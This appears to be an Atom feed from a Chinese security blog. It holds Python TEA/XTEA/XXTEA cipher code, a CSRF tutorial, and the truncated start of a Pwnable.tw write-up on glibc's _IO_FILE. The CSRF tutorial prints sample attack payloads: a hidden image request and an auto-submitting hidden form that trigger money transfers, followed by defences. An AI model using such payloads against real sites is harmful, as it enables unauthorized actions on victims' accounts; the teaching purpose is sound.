    <content type="html"><![CDATA[<p>闲来无事，喝杯茶冷静一下。</p><a id="more"></a><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a><a href="https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm" target="_blank" rel="noopener">TEA</a></h1><p>微型加密算法（<code>Tiny Encryption Algorithm</code>，<code>TEA</code>）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。<code>TEA</code>操作处理在两个<code>32</code>位无符号整型上（可能源于一个<code>64</code>位数据），并且使用一个<code>128</code>位的密钥。设计者是<code>Roger Needham</code>和<code>David Wheeler</code>。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/1.png" alt="TEA算法详解"></p><p>Python 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">k0 = k[<span class="number">0</span>]</span><br><span class="line">k1 = k[<span class="number">1</span>]</span><br><span class="line">k2 = k[<span class="number">2</span>]</span><br><span class="line">k3 = k[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">x += delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0xC6EF3720</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">k0 = k[<span class="number">0</span>]</span><br><span class="line">k1 = k[<span class="number">1</span>]</span><br><span class="line">k2 = k[<span class="number">2</span>]</span><br><span class="line">k3 = k[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">x -= delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">plain = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">encrypted = encrypt(plain, key)</span><br><span class="line"><span class="keyword">print</span> encrypted</span><br><span class="line">decrypted = decrypt(encrypted, key)</span><br><span class="line"><span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a><a href="https://en.wikipedia.org/wiki/XTEA" target="_blank" rel="noopener">XTEA</a></h1><p><code>XTEA</code>是<code>TEA</code>的升级版，增加了更多的密钥表，移位和异或操作等等。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/2.png" alt="XTEA算法详解"></p><p>Python 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(rounds, v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">x += delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(rounds, v, k)</span>:</span></span><br><span class="line">v0 = v[<span class="number">0</span>]</span><br><span class="line">v1 = v[<span class="number">1</span>]</span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line">x = delta * rounds</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">x -= delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">v[<span class="number">0</span>] = v0</span><br><span class="line">v[<span class="number">1</span>] = v1</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">plain = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">rounds = <span class="number">32</span></span><br><span class="line">encrypted = encrypt(rounds, plain, key)</span><br><span class="line"><span class="keyword">print</span> encrypted</span><br><span class="line">decrypted = decrypt(rounds, encrypted, key)</span><br><span class="line"><span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure><h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a><a href="https://en.wikipedia.org/wiki/XXTEA" target="_blank" rel="noopener">XXTEA</a></h1><p><code>XXTEA</code>，又称<code>Corrected Block TEA</code>，是<code>XTEA</code>的升级版。</p><p>加密过程：</p><p><img src="/pics/Python实现TEA、XTEA、XXTEA加密解密算法/3.png" alt="XXTEA算法详解"></p><p>Python 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shift</span><span class="params">(z, y, x, k, p, e)</span>:</span></span><br><span class="line"><span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxtea</span><span class="params">(v, n, k)</span>:</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br><span class="line"><span class="keyword">if</span> n &gt; <span class="number">1</span>:</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">z = v[n - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">x += delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">y = v[p + <span class="number">1</span>]</span><br><span class="line">v[p] += shift(z, y, x, k, p, e)</span><br><span class="line">v[p] = v[p] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">z = v[p]</span><br><span class="line">p += <span class="number">1</span></span><br><span class="line">y = v[<span class="number">0</span>]</span><br><span class="line">v[n - <span class="number">1</span>] += shift(z, y, x, k, p, e)</span><br><span class="line">v[n - <span class="number">1</span>] = v[n - <span class="number">1</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">z = v[n - <span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">n = -n</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n</span><br><span class="line">x = rounds * delta</span><br><span class="line">y = v[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(rounds):</span><br><span class="line">e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(n - <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">z = v[p - <span class="number">1</span>]</span><br><span class="line">v[p] -= shift(z, y, x, k, p, e)</span><br><span class="line">v[p] = v[p] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">y = v[p]</span><br><span class="line">p -= <span class="number">1</span></span><br><span class="line">z = v[n - <span class="number">1</span>]</span><br><span class="line">v[<span class="number">0</span>] -= shift(z, y, x, k, p, e)</span><br><span class="line">v[<span class="number">0</span>] = v[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">y = v[<span class="number">0</span>]</span><br><span class="line">x -= delta</span><br><span class="line">x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">plain = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">n = <span class="number">2</span></span><br><span class="line">encrypted = xxtea(plain, n, key)</span><br><span class="line"><span class="keyword">print</span> encrypted</span><br><span class="line">decrypted = xxtea(encrypted, -n, key)</span><br><span class="line"><span class="keyword">print</span> decrypted</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019" target="_blank" rel="noopener">https://blog.csdn.net/gsls200808/article/details/48243019</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无事，喝杯茶冷静一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://qianfei11.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>从零开始认识跨站请求伪造（Cross-site Request Forgery）</title>
    <link href="https://qianfei11.github.io/2019/08/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%AE%A4%E8%AF%86%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88Cross-site-Request-Forgery%EF%BC%89/"/>
    <id>https://qianfei11.github.io/2019/08/20/从零开始认识跨站请求伪造（Cross-site-Request-Forgery）/</id>
    <published>2019-08-20T05:51:34.000Z</published>
    <updated>2019-08-26T05:46:11.368Z</updated>
    
    <content type="html"><![CDATA[<p>常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。</p><a id="more"></a><h1 id="What-is-CSRF"><a href="#What-is-CSRF" class="headerlink" title="What is CSRF"></a>What is CSRF</h1><p>CSRF（跨站请求伪造，<code>Cross-site Request Forgery</code>）也被称为<code>One-click Attack</code>或者<code>Session Riding</code>。简单的来说，就是<strong>攻击者利用受害者的身份，以受害者的名义发送恶意请求</strong>。</p><p>CSRF 这种攻击方式在 2000 年被国外的安全人员提出，但在国内，直到 2006 年才开始被关注。2008 年，国内外的多个大型社区和交互网站分别爆出 CSRF 漏洞，如：纽约时报，Metafilter，YouTube，百度等等。而现在，互联网的许多站点仍对此毫无防备，以至于安全业界称 CSRF 为“沉睡的巨人”。</p><p><img src="/pics/从零开始认识跨站请求伪造/1.png" alt="CSRF原理"></p><p>首先比较一下 XSS 和 CSRF：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># XSS</span><br><span class="line">攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击</span><br><span class="line">XSS容易发现，因为攻击者需要登录后台完成攻击。管理员可以看日志发现攻击者</span><br><span class="line">XSS的目的是获取用户的身份信息，攻击者窃取到的是用户的身份（session/cookie）</span><br><span class="line"># CSRF</span><br><span class="line">攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</span><br><span class="line">CSRF的攻击一直是管理员自己实现的，攻击者只负责了构造代码</span><br><span class="line">CSRF是利用用户当前的身份去做一些未经过授权的操作</span><br></pre></td></tr></table></figure><p>用一个小故事简单的介绍一下什么是 CSRF：</p><ol><li>我们先假设支付宝存在 CSRF 漏洞，受害者的支付宝账号是<code>alibaba</code>，攻击者的支付宝账号是<code>hacker</code></li><li>然后我们通过网页请求的方式<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=alibaba2</code>可以把账号<code>alibaba</code>的 10000 元转到另外一个账号<code>alibaba2</code>上去。通常情况下，该请求发送到支付宝服务器后，服务器会先验证该请求是否来自一个合法的<code>session</code>并且该<code>session</code>的用户已经成功登陆</li><li>攻击者在支付宝有账号<code>hacker</code>，并且他知道上文中的 URL 可以进行转账操作，于是他可以发送一个请求<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker</code>到支付宝后台。但是这个请求是来自攻击者而不是来自<code>alibaba</code>，所以不能通过安全认证，因此该请求作废</li><li>这时，攻击者<code>hacker</code>想到了用 CSRF 的方式，他自己做了个黄色网站，在网站中放了如下代码：<code>http://zhifubao.com/withdraw?account=alibaba&amp;amount=10000&amp;for=hacker</code>，并且通过黄色链接诱使受害者来访问他的网站。当受害者禁不住诱惑时就会点了进去，上述请求就会从受害者的浏览器发送到支付宝，而且这个请求会附带受害者的浏览器中的<code>cookie</code></li><li>大多数情况下，该请求会失败，因为支付宝会要求受害者的认证信息，但是如果刚访问支付宝不久，还没有关闭支付宝页面，浏览器中的<code>cookie</code>仍然存有认证信息，这个请求就会得到响应，从受害者的账户中转 10000 元到<code>hacker</code>账户里，而受害者丝毫不知情，攻击者拿到钱后逍遥法外</li></ol><h1 id="How-to-Attack"><a href="#How-to-Attack" class="headerlink" title="How to Attack"></a>How to Attack</h1><p>CSRF 有两种攻击方式，一种是基于 GET 请求方式的利用，另一种是基于 POST 请求方式的利用。</p><h2 id="Get-Method"><a href="#Get-Method" class="headerlink" title="Get Method"></a>Get Method</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;https://www.xxx.com/bank.php?transferTo=hacker&apos; width=&apos;0&apos; height=&apos;0&apos; /&gt;</span><br><span class="line">&lt;a href=&apos;/test&apos;&gt;start&lt;/a&gt;</span><br></pre></td></tr></table></figure><h2 id="Post-Method"><a href="#Post-Method" class="headerlink" title="Post Method"></a>Post Method</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;form method=&apos;POST&apos; action=&apos;https://www.xxx.com/bank.php&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;</span><br><span class="line">  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;</span><br><span class="line">  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="How-to-Prevent"><a href="#How-to-Prevent" class="headerlink" title="How to Prevent"></a>How to Prevent</h1><p>防范 CSRF 攻击，其实本质就是要求网站能够识别出哪些请求是非正常用户主动发起的。这就要求我们在请求中嵌入一些额外的授权数据，让网站服务器能够区分出这些未授权的请求。</p><h2 id="Synchronizer-token-pattern"><a href="#Synchronizer-token-pattern" class="headerlink" title="Synchronizer token pattern"></a>Synchronizer token pattern</h2><p>令牌同步模式（Synchronizer token pattern，简称 STP）是在用户请求的页面中的所有表单中嵌入一个 token，在服务端验证这个 token 的技术。token 可以是任意的内容，但是一定要保证无法被攻击者猜测到或者查询到。攻击者在请求中无法使用正确的 token，因此可以判断出未授权的请求</p><h2 id="Cookie-to-Header-Token"><a href="#Cookie-to-Header-Token" class="headerlink" title="Cookie-to-Header Token"></a>Cookie-to-Header Token</h2><p>对于使用 Js 作为主要交互技术的网站，将 CSRF 的 token 写入到 cookie 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: CSRF-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/</span><br></pre></td></tr></table></figure><p>然后使用 javascript 读取 token 的值，在发送 http 请求的时候将其作为请求的 header</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-CSRF-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql</span><br></pre></td></tr></table></figure><p>最后服务器验证请求头中的 token 是否合法</p><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>使用验证码可以杜绝 CSRF 攻击，但是这种方式要求每个请求都输入一个验证码，显然没有哪个网站愿意使用这种粗暴的方式，用户体验太差，用户会疯掉的。</p><h2 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h2><p>根据 HTTP 协议，在 HTTP 头部中有一个 Referer 字段，它记录了该 HTTP 请求所在的地址，表示 HTTP 请求从那个页面发出的。比如当访问<code>http://zhifubao.com/withdraw?account=lyq&amp;amount=10000&amp;for=xxx</code>，用户必须先登录支付宝网站，然后通过点击页面的的按钮来触发转账事件。此时，转账请求的 Referer 值就是转账页面所在的 URL，通常是以<code>zhifubao.com</code>域名开头的地址。如果攻击者要实行 CSRF 攻击，那么他只能在自己的站点构造请求，此时 Referer 的值就指向黑客自己的网站。因此要防御 CSRF 攻击，支付宝只需要对每一个转账请求验证其 Referer 值，如果是以<code>zhifubao.com</code>开头的域名，则是合法请求，相反，则是非法请求并拒绝。</p><p>这种方法的好处就是简单易行，只需要在后台添加一个拦截器来检查 Referer 即可。然而这种办法并不是万无一失，Referer 的值是由浏览器提供的，一些低级的浏览器可以通过某种方式篡改 Referer 的值，这就给了攻击者可乘之机；而一些高级浏览器处于安全考虑，可以让用户设置发送 HTTP 请求时不再提供 Referer 值，这样当他们正常访问支付宝网站时，因为没有提供 Referer 值而被误认为 CERF 攻击，拒绝访问。实际应用中通常采用第二种方法来防御 CSRF 攻击。</p><h2 id="尽量使用-POST，限制-GET"><a href="#尽量使用-POST，限制-GET" class="headerlink" title="尽量使用 POST，限制 GET"></a>尽量使用 POST，限制 GET</h2><p>GET 接口能够直接将请求地址暴露给攻击者，所以要防止 CSRF 一定最好不要用 GET。当然 POST 并不是万无一失，攻击者只需要构造一个 form 表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p><h2 id="在-HTTP-头部添加自定义属性"><a href="#在-HTTP-头部添加自定义属性" class="headerlink" title="在 HTTP 头部添加自定义属性"></a>在 HTTP 头部添加自定义属性</h2><p>这种方法也是使用 token 并验证，但是它是把 token 放在 HTTP 请求头部中。通过使用 AJAX 我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成 AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p><h1 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h1><ul><li><a href="http://exp-blog.com/2019/01/13/pid-2927/" target="_blank" rel="noopener">RootMe 解题报告 [Web-Client : CSRF – 0 protection]</a></li><li><a href="http://exp-blog.com/2019/01/13/pid-2933/" target="_blank" rel="noopener">RootMe 解题报告 [Web-Client : CSRF – token bypass]</a></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.freebuf.com/articles/web/55965.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/55965.html</a><br><a href="https://segmentfault.com/a/1190000008505616" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008505616</a><br><a href="https://www.jianshu.com/p/855395f9603b" target="_blank" rel="noopener">https://www.jianshu.com/p/855395f9603b</a><br><a href="https://juejin.im/post/5bc009996fb9a05d0a055192" target="_blank" rel="noopener">https://juejin.im/post/5bc009996fb9a05d0a055192</a><br><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a><br><a href="https://blog.techbridge.cc/2017/02/25/csrf-introduction/" target="_blank" rel="noopener">https://blog.techbridge.cc/2017/02/25/csrf-introduction/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常常听到 CSRF，但不怎么了解它具体的机制，简单记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://qianfei11.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.tw seethefile</title>
    <link href="https://qianfei11.github.io/2019/08/17/Pwnable-tw-seethefile/"/>
    <id>https://qianfei11.github.io/2019/08/17/Pwnable-tw-seethefile/</id>
    <published>2019-08-17T02:43:55.000Z</published>
    <updated>2019-08-26T05:51:33.315Z</updated>
    
    <content type="html"><![CDATA[<p>Get familiar with <code>_IO_FILE</code>.</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>关于<a href="https://code.woboq.org/userspace/glibc/libio/bits/types/struct_FILE.h.html" target="_blank" rel="noopener"><code>_IO_FILE</code>的结构体</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;                <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_ptr;        <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_end;        <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_read_base;        <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_ptr;        <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_write_end;        <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_base;        <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span 